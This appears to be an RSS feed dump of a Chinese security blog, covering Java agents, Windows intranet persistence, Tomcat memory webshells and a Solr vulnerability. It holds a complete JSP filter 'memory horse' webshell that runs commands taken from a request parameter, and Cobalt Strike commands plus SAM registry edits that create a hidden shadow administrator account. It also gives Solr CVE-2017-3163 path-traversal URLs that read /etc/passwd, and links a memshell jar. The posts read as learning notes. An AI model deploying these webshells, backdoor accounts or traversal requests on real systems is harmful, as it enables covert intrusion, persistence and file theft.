alt=""></p><p>成功修改了字节码。<br>在DefineTransformer中，里面出现了$1,$2.这指的是函数的第一个和第二个参数，这之前的文章有说到过。</p><h2 id="JVM启动后"><a href="#JVM启动后" class="headerlink" title="JVM启动后"></a>JVM启动后</h2><p>上面介绍的Instrumentation是这JDK1.5中提供的，开发者只能在main加载之前添加手脚，在Java SE 6中，提供了新的代理agentmain</p><p>跟premain方法一样<br>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p><ul><li>public static void agentmain(String agentArgs, Instrumentation inst);</li><li>public static void agentmain(String agentArgs);</li></ul><p>这两组方法的第一个参数AgentArgs是随同 “– javaagent”一起传入的程序参数，如果这个字符串代表了多个参数，就需要自己解析这些参数。inst是Instrumentation类型的对象，是JVM自动传入的，我们可以拿这个参数进行类增强等操作。</p><p>指定Main-Class</p><p>Agent-Class: class</p><p>Agent.java</p><pre><code class="java">package org.com;import javassist.*;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;//public class DefineTransformer implements ClassFileTransformer &#123;//    @Override//    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;//        System.out.println(&quot;premain load Class:&quot; + className);//        return new byte[0];//    &#125;//&#125;public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        if(&quot;org/com/Main&quot;.equals(className))&#123;            final ClassPool classPool = ClassPool.getDefault();            try &#123;                final CtClass clazz = classPool.get(&quot;org.com.Main&quot;);                CtMethod main = clazz.getDeclaredMethod(&quot;test&quot;);                String methodBody = &quot;&#123; String c = $1.concat(\&quot;-AAA-\&quot;).concat($2);&quot; +                        &quot;System.out.println(&quot;+ &quot;c.toString()&quot;+&quot;);&#125;&quot;;                main.setBody(methodBody);                // 返回字节码，并且detachCtClass对象                byte[] byteCode = clazz.toBytecode();                //detach的意思是将内存中曾经被javassist加载过的Main对象移除，如果下次有需要在内存中找不到会重新走javassist加载                clazz.detach();                return byteCode;            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;        return null;    &#125;&#125;</code></pre><p>Main.java</p><pre><code class="java">package org.com;import com.sun.tools.attach.*;import java.io.IOException;import java.util.List;public class Main &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        System.out.println(&quot;running JVM start &quot;);        test(&quot;a&quot;,&quot;bcd&quot;);        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd: list)&#123;            System.out.println(vmd.displayName());            if(vmd.displayName().equals(&quot;org.com.Main&quot;))&#123;                VirtualMachine attach = VirtualMachine.attach(vmd.id());                attach.loadAgent(&quot;F:\\IDEAcode\\agent_test\\out\\artifacts\\agent_test_jar\\agent_test.jar&quot;);                attach.detach();            &#125;        &#125;    &#125;    public static void test(String a1, String a2)&#123;        System.out.println(&quot;test&quot;);    &#125;&#125;</code></pre><p>这里偷懒了，用了别人写的代码<br>当然MANIFEST.MF文件也是要修改的，这里就不再说怎么改了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqc07utyuvj31f6099jsn.jpg" alt=""></p><h3 id="premain与agentmain的区别："><a href="#premain与agentmain的区别：" class="headerlink" title="premain与agentmain的区别："></a>premain与agentmain的区别：</h3><p>premain和agentmain两种方式最终的目的都是为了回调Instrumentation实例并激活sun.instrument.InstrumentationImpl#transform()（InstrumentationImpl是Instrumentation的实现类）从而回调注册到Instrumentation中的ClassFileTransformer实现字节码修改，本质功能上没有很大区别。两者的非本质功能的区别如下：</p><ul><li><p>premain方式是JDK1.5引入的，agentmain方式是JDK1.6引入的，JDK1.6之后可以自行选择使用premain或者agentmain。</p></li><li><p>premain需要通过命令行使用外部代理jar包，即-javaagent:代理jar包路径；agentmain则可以通过attach机制直接附着到目标VM中加载代理，也就是使用agentmain方式下，操作attach的程序和被代理的程序可以是完全不同的两个程序。</p></li><li><p>premain方式回调到ClassFileTransformer中的类是虚拟机加载的所有类，这个是由于代理加载的顺序比较靠前决定的，在开发者逻辑看来就是：所有类首次加载并且进入程序main()方法之前，premain方法会被激活，然后所有被加载的类都会执行ClassFileTransformer列表中的回调。</p></li><li><p>agentmain方式由于是采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class&lt;?&gt;… classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调。</p></li><li><p>通过premain方式的代理Jar包进行了更新的话，需要重启服务器，而agentmain方式的Jar包如果进行了更新的话，需要重新attach，但是agentmain重新attach还会导致重复的字节码插入问题，不过也有Hotswap和DCE VM方式来避免。</p></li></ul><h2 id="基于agent的内存马"><a href="#基于agent的内存马" class="headerlink" title="基于agent的内存马"></a>基于agent的内存马</h2><p>我自己试了试，没有成功。所以打算中后面的文章里面结合序列化在试试看。但是我中github上找到了其他师傅打包好的jar包：<a href="https://github.com/ydnzol/memshell">https://github.com/ydnzol/memshell</a></p><p>不过这个jar包没有使用ShutdownHook来复活内存马。这里我是在docker上进行试验的，不得不吐槽一下m1真的有点坑呀，后来无奈下只能去Windows10上搭docker的环境了QAQ。</p><p>但是因为很久没用docker了，Windows以前的docker好像没用了，我去官网上查，发现之前的版本已经作废，搞到半夜才弄好，我果然是废物QAQ。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqc5o74n5mj30lc090jrl.jpg" alt=""></p><p>具体agent内存马下篇文章再写吧。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透--远程桌面</title>
    <link href="http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <id>http://yoursite.com/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</id>
    <published>2021-04-29T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:56.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–远程桌面"><a href="#内网渗透–远程桌面" class="headerlink" title="内网渗透–远程桌面"></a>内网渗透–远程桌面</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学代码审计有些枯燥，加上俺内网啥也不会，学学内网换换口味。</p><h1 id="隐藏用户的创建"><a href="#隐藏用户的创建" class="headerlink" title="隐藏用户的创建"></a>隐藏用户的创建</h1><p>因为在Windows环境下创建用户后面如果带入一个“$”符号，在net user时默认是不显示的。</p><p>利用条件：获得管理员权限</p><p>首先在cs中输入以下命令</p><blockquote><p>shell net user admin$ 123456 /add</p></blockquote><blockquote><p>shell net localgroup administrators admin$ /add</p></blockquote><p>第一句是创建一个admin$用户密码为123456.第二句是将用户加入管理组。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0ls1cy2lj30hi065dfx.jpg" alt=""></p><p>我们来验证一下，使用net user命令并无admin用户<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0lst1s90j30i308i74c.jpg" alt=""></p><p>然后远程打开3389端口。</p><blockquote><p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p></blockquote><p>现在已经可以远程连接了，但是中用户组中依然可以看见admin$<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qc4qewkj30m30giaan.jpg" alt=""></p><p>现在我们想办法把这里的admin$也隐藏掉</p><p>利用 运行 输入regedit 打开注册表 ，找到如下图的SAM</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qjibq6xj30sc0i53zp.jpg" alt=""><br>选择SAM 项 ，在工具栏上的“编辑 &gt; 权限” 中设置权限 ，将 Administrators组 的权限设置为完全控制 后保存</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qkwb6svj30bu0ge0t4.jpg" alt=""></p><p>注意！！！这里的拒绝修改是不可逆的</p><p>设置好后重开页面会出现新的子项</p><blockquote><p>SAM &gt; Domains &gt; Account &gt; Users 和 Names</p></blockquote><p>分别找到Administrator用户和admin$用户的两个项<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qx3bgeyj30pm0godlu.jpg" alt=""></p><p>将administrator的F表复制下来，替换admin$的表后导出<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qy6yiodj30lr0fwmxu.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qyechzwj304306t3yf.jpg" alt=""></p><p>再将admin$用户删除</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qymnmpij30cm06bmx7.jpg" alt=""></p><blockquote><p>net user admin$ /del</p></blockquote><p>再将注册表导入</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzn13b9j30dv03qt8v.jpg" alt=""></p><p>现在用户组中已经看不见我们的影子用户</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0qzsrqxnj30p00c8t9f.jpg" alt=""></p><p>但是现在3389不能连接</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0hkgesj30db0gkdgd.jpg" alt=""><br>点击右下角选择用户添加admin$</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq0r0sl2qxj30c70bcjrl.jpg" alt=""></p><p>现在就可以登录了。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内存马初探</title>
    <link href="http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/"/>
    <id>http://yoursite.com/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/</id>
    <published>2021-04-18T10:05:01.000Z</published>
    <updated>2021-07-29T05:46:45.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存马初探-Filter"><a href="#内存马初探-Filter" class="headerlink" title="内存马初探-Filter"></a>内存马初探-Filter</h1><h2 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h2><p>tomcat其实质上就是一个大点的servlet容器，那什么是容器呢，我觉得其实就是一个类。在tomcat中各个容器之间嵌套。而这些容器都是有生命周期的java类，都继承了共同的接口Lifecycle，所以Lifecycle就是这些容器的顶层接口。下面来谈谈存在哪些容器。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul><li>init()方法：初始化容器组件，它必须在启动容器之前调用。它会创建许多对象。</li><li>start():启动容器，比如启动一个Server。</li><li>stop()：停止执行</li><li>destroy()：销毁这个容器。</li><li>Server容器：一个StandardServer类实例就表示一个Server容器</li><li>Service容器：一个StandardService类实例就表示一个Service容器</li><li>Engine容器：一个StandardEngine类实例就表示一个Engine容器。</li><li>Host容器：一个StandardHost类实例就表示一个Host容器。</li><li>Context容器：一个StandardContext类实例就表示一个Context容器。</li><li>Wrapper容器：一个StandardWrapper类实例就表示一个Wrapper容器。</li></ul><p>这些容器全都是从上到下嵌套，<strong>需要注意的是这些容器虽然存在父子关系，但是它们的java类并没有父子。</strong></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnsa4ppxhj30o60mwmyx.jpg" alt=""></p><pre><code class="java">/**     * Add a child Container, only if the proposed child is an implementation     * of Context.     *     * @param child Child container to be added     */    @Override    public void addChild(Container child) &#123;        child.addLifecycleListener(new MemoryLeakTrackingListener());        if (!(child instanceof Context))//这里说明Host容器的子容器只能是Context容器            throw new IllegalArgumentException                (sm.getString(&quot;standardHost.notContext&quot;));        super.addChild(child);    &#125;</code></pre><p>一个Host容器中可以有多个Wrapper容器。</p><pre><code class="java">    /**     * Add a child Container, only if the proposed child is an implementation     * of Wrapper.     *     * @param child Child container to be added     *     * @exception IllegalArgumentException if the proposed container is     *  not an implementation of Wrapper     */    @Override    public void addChild(Container child) &#123;        // Global JspServlet        Wrapper oldJspServlet = null;        if (!(child instanceof Wrapper)) &#123;//这里说明Context容器的子容器只能是Wrapper容器。            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.notWrapper&quot;));        &#125;　　　　　　//这里删除了部分代码    &#125;</code></pre><h2 id="内存马简单介绍"><a href="#内存马简单介绍" class="headerlink" title="内存马简单介绍"></a>内存马简单介绍</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>servlet-api<ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul></li><li>指定框架，如spring</li><li>字节码增强型</li><li>任意JSP文件隐藏</li></ul><p>在Tomcat中我们对Servlet进行访问的时候会先通过Filter，如下图所示。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnt4cngtwj30hv0abjrc.jpg" alt=""></p><p>因此我们只要中Filter中插入恶意代码，就可以进行命令执行，形成一个内存马。</p><p>Filter：自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。</p><ul><li>启动时调用init()方法</li><li>工作时调用doFilter()</li><li>销毁时调用destroy()</li></ul><p>在tomcat中ServletContext的实现是ApplicationContext。在Web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnthaev47j30q80wegs4.jpg" alt=""></p><h3 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h3><p>我们自己写一个Filter然后下断点，然后跟进createFilterChain。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpny2fgoorj31do0e4jui.jpg" alt=""></p><pre><code class="java">filterChain.setServlet(servlet);            filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());            StandardContext context = (StandardContext)wrapper.getParent();            FilterMap[] filterMaps = context.findFilterMaps();            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;                String servletName = wrapper.getName();                int i;                ApplicationFilterConfig filterConfig;                boolean isCometFilter;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersURL(filterMaps[i], requestPath)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var18) &#123;                                    Throwable t = ExceptionUtils.unwrapInvocationTargetException(var18);                                    ExceptionUtils.handleThrowable(t);                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                for(i = 0; i &lt; filterMaps.length; ++i) &#123;                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersServlet(filterMaps[i], servletName)) &#123;                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());                        if (filterConfig != null) &#123;                            isCometFilter = false;                            if (comet) &#123;                                try &#123;                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;                                &#125; catch (Exception var17) &#123;                                &#125;                                if (isCometFilter) &#123;                                    filterChain.addFilter(filterConfig);                                &#125;                            &#125; else &#123;                                filterChain.addFilter(filterConfig);                            &#125;                        &#125;                    &#125;                &#125;                return filterChain;            &#125; else &#123;                return filterChain;            &#125;        &#125;</code></pre><p>可以看见这里主要是对filterconfig和filterMap进行的操作，而在代码中首先获取了StandardContext其中有三个成员变量和filter相关：</p><p>filter关键的3个属性和2个方法</p><ul><li>FilterConfigs存放了filterDef还保存了当时的Context</li><li>FilterDefs存放了filter的定义，比如名称跟对应的类，类似于<pre><code>  &lt;filter&gt;      &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;      &lt;filter-class&gt;filterDemo&lt;/filter-class&gt;  &lt;/filter&gt;</code></pre></li><li>FilterMaps 存放了所有filter相关的信息包括filterName和urlPattern</li><li>addFilterDef(填充filterDef对象)</li><li>filterStart(初始化 filterConfigs )</li></ul><pre><code class="java">//tomcat 标准 contextpublic class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    //servletContext     protected ApplicationContext context = null;    //获取servletContext    @Override    public ServletContext getServletContext() &#123;        if (context == null) &#123;            context = new ApplicationContext(this);            if (altDDName != null)                context.setAttribute(Globals.ALT_DD_ATTR,altDDName);        &#125;        return context.getFacade();    &#125;    //filterMaps 封装的对象    private final ContextFilterMaps filterMaps = new ContextFilterMaps();        @Override    //servletContext添加filter时调用    public void addFilterMap(FilterMap filterMap) &#123;        validateFilterMap(filterMap);        // Add this filter mapping to our registered set        filterMaps.add(filterMap);        fireContainerEvent(&quot;addFilterMap&quot;, filterMap);    &#125;    //获取filterMaps     //请求到达时获取    @Override    public FilterMap[] findFilterMaps() &#123;        return filterMaps.asArray();    &#125;    //filtername 和 filterconfig 映射    private Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap&lt;&gt;();    //通过filtername获取filterconfig bean实例    public FilterConfig findFilterConfig(String name) &#123;        return filterConfigs.get(name);    &#125;    //通过 filterDefs 生成 filterconfigs 映射    public boolean filterStart() &#123;        if (getLogger().isDebugEnabled()) &#123;            getLogger().debug(&quot;Starting filters&quot;);        &#125;        // Instantiate and record a FilterConfig for each defined filter        boolean ok = true;        synchronized (filterConfigs) &#123;            filterConfigs.clear();            for (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;                String name = entry.getKey();                if (getLogger().isDebugEnabled()) &#123;                    getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);                &#125;                try &#123;                    ApplicationFilterConfig filterConfig =                            new ApplicationFilterConfig(this, entry.getValue());                    filterConfigs.put(name, filterConfig);                &#125; catch (Throwable t) &#123;                    t = ExceptionUtils.unwrapInvocationTargetException(t);                    ExceptionUtils.handleThrowable(t);                    getLogger().error(sm.getString(                            &quot;standardContext.filterStart&quot;, name), t);                    ok = false;                &#125;            &#125;        &#125;        return ok;    &#125;    //filterDefs定义    private Map&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;();    //添加filterDef    public void addFilterDef(FilterDef filterDef) &#123;        synchronized (filterDefs) &#123;            filterDefs.put(filterDef.getFilterName(), filterDef);        &#125;        fireContainerEvent(&quot;addFilterDef&quot;, filterDef);    &#125;    //查找filterDef    public FilterDef findFilterDef(String filterName) &#123;        synchronized (filterDefs) &#123;            return filterDefs.get(filterName);        &#125;    &#125;&#125;</code></pre><p>ApplicationContext</p><p>实现了 ServletContext 中的 addFilter 方法</p><p>向属性中的StandandContext实例添加filterDef</p><pre><code class="java">public class ApplicationContext implements ServletContext &#123;    //标准上下文属性  包含 filterConfigs filterMaps filterDefs 属性    private final StandardContext context;    //调用StandandContext添加filterDef    private FilterRegistration.Dynamic addFilter(String filterName,            String filterClass, Filter filter) throws IllegalStateException &#123;        if (filterName == null || filterName.equals(&quot;&quot;)) &#123;            throw new IllegalArgumentException(sm.getString(                    &quot;applicationContext.invalidFilterName&quot;, filterName));        &#125;        if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;            //TODO Spec breaking enhancement to ignore this restriction            throw new IllegalStateException(                    sm.getString(&quot;applicationContext.addFilter.ise&quot;,                            getContextPath()));        &#125;        FilterDef filterDef = context.findFilterDef(filterName);        // Assume a &#39;complete&#39; FilterRegistration is one that has a class and        // a name        if (filterDef == null) &#123;            filterDef = new FilterDef();            filterDef.setFilterName(filterName);            context.addFilterDef(filterDef);        &#125; else &#123;            if (filterDef.getFilterName() != null &amp;&amp;                    filterDef.getFilterClass() != null) &#123;                return null;            &#125;        &#125;        if (filter == null) &#123;            filterDef.setFilterClass(filterClass);        &#125; else &#123;            filterDef.setFilterClass(filter.getClass().getName());            filterDef.setFilter(filter);        &#125;        return new ApplicationFilterRegistration(filterDef, context);    &#125;&#125;</code></pre><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>context启动时，调用ServletContainerInitializers添加filter，调用AbstractFilterRegistrationBean类的addRegistration方法向context添加filter</li><li>context中不存在FilterDef则创建对应FilterDef</li><li>AbstractFilterRegistrationBean中configure方法添加匹配filter的uri，默认为/*</li><li>context启动时，调用filterStart方法配置初始化ApplicationFilterConfig</li><li>调用filter的init方法</li><li>对每次到达的请求在StandardWrapperVavel的invoke方法中创建过滤器链</li><li>根据名称获得ApplicationFilterConfig添加到过滤器链，通过ApplicationFilterConfig来获取filter执行</li></ol><h3 id="具体函数"><a href="#具体函数" class="headerlink" title="具体函数"></a>具体函数</h3><ol><li><p>ServletContainerInitializer(TomcatStarter实现类).onStartup() 调用 ServletContextInitializer.onStartup(ServletContext)</p></li><li><p>ServletContextInitializer(AbstractFilterRegistrationBean实现类).onStartup(ServletContext) 调用 ServletContext.addFilter() 方法</p></li><li><p>ServletContext(ApplicationContext实现类).addFilter 方法调用了 StandandContext.addFilterDef()</p></li><li><p>StandandContext.addFilterDef() 方法填充 StandandContext.filterDefs</p></li><li><p>StandandContext.filterStart()方法根据 StandandContext.filterDefs属性 填充 StandandContext.filterConfigs</p></li><li><p>ApplicationFilterFactory根据StandandContext生成filterchain</p></li><li><p>StandardWrapperValve中调用filterchain.doFilter() 方法</p></li><li><p>filterchain结束后调用servlet.service方法</p></li></ol><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li>获取standcontext</li><li>创建恶意Filter</li><li>创建FilterDef并将Filtername和FilterClass放入</li><li>将FilterDef添加到FilterDefs和filterconfig中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</li></ul><h3 id="如何获取stancontext"><a href="#如何获取stancontext" class="headerlink" title="如何获取stancontext"></a>如何获取stancontext</h3><p>到这里我们就要思考context是如何获取的呢？下面给出三种方法</p><ul><li>由ServletContext转StandardContext如果可以直接获取到request对象的话可以用这种方法</li><li>从当前线程中获取</li><li>从MBean中获取<br>最后给出代码：</li></ul><pre><code class="java">&lt;%--  Created by IntelliJ IDEA.  User: xiaotan  Date: 2021/4/16  Time: 21:03  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    String name =&quot;pyshare&quot;;    ServletContext servletContext = request.getServletContext();    ApplicationContextFacade contextFacade = (ApplicationContextFacade) servletContext;    Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(&quot;context&quot;);    applicationContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(contextFacade);    Field field = ApplicationContext.class.getDeclaredField(&quot;context&quot;);    field.setAccessible(true);    StandardContext standardContext = (StandardContext) field.get(applicationContext);    Field filterConfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    filterConfigs.setAccessible(true);    Map configs = (Map) filterConfigs.get(standardContext);    if (configs.get(name) == null)&#123;        Filter filter = new Filter()&#123;            @Override            public void init(FilterConfig filterConfig)  &#123;            &#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                String cmd;                if ((cmd = servletRequest.getParameter(&quot;pyshare&quot;)) != null) &#123;                    Process process = Runtime.getRuntime().exec(cmd);                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                            new java.io.InputStreamReader(process.getInputStream()));                    StringBuilder stringBuilder = new StringBuilder();                    String line;                    while ((line = bufferedReader.readLine()) != null) &#123;                        stringBuilder.append(line + &#39;\n&#39;);                    &#125;                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                    servletResponse.getOutputStream().flush();                    servletResponse.getOutputStream().close();                    return;                &#125;                filterChain.doFilter(servletRequest, servletResponse);            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        FilterDef filterDef = new FilterDef();        filterDef.setFilter(filter);        filterDef.setFilterName(name);        filterDef.setFilterClass(filter.getClass().getName());        standardContext.addFilterDef(filterDef);        FilterMap filterMap = new FilterMap();        filterMap.setFilterName(name);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        filterMap.addURLPattern(&quot;/*&quot;);        /**         * 将filtermap 添加到 filterMaps 中的第一个位置         */        standardContext.addFilterMapBefore(filterMap);        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        configs.put(name,filterConfig);        out.write(&quot;success&quot;);    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnzmkkhd9j310v0u0txq.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>但是其实还是没有实现无文件，后面还要结合反序列化漏洞注入内存马</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a><br><a href="https://www.anquanke.com/post/id/219177">https://www.anquanke.com/post/id/219177</a><br><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</a></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>solr漏洞分析--CVE-2017-3163</title>
    <link href="http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/"/>
    <id>http://yoursite.com/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/</id>
    <published>2021-04-11T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:54.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="solr漏洞分析–CVE-2017-3163"><a href="#solr漏洞分析–CVE-2017-3163" class="headerlink" title="solr漏洞分析–CVE-2017-3163"></a>solr漏洞分析–CVE-2017-3163</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>solr 6.4.0<br>java 1.8</p><p>solr 所有版本下载地址：<a href="http://archive.apache.org/dist/lucene/solr/">http://archive.apache.org/dist/lucene/solr/</a></p><p>启动低版本启动，在example目录下：</p><blockquote><p>java -Xdebug -Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=y -jar start.jar</p></blockquote><p>高版本启动,bin目录下：</p><blockquote><p>./solr.cmd -f -a “-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10010” -port 8983 -s “./Solr/solr-6.4.0/example/example-DIH/solr”</p></blockquote><p>IDEA:<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeu966q2jj31b90u0n3r.jpg" alt=""></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>1.4.0-6.4.0</li></ul><p>低版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p>较高版本：</p><blockquote><p><a href="http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1">http://127.0.0.1:8983/solr/db/replication?command=filecontent&amp;file=../../../../../../../../../../../../../etc/passwd&amp;wt=filestream&amp;generation=1</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeudj1f4pj30y40kijwt.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeugygyfpj322w0f8q8b.jpg" 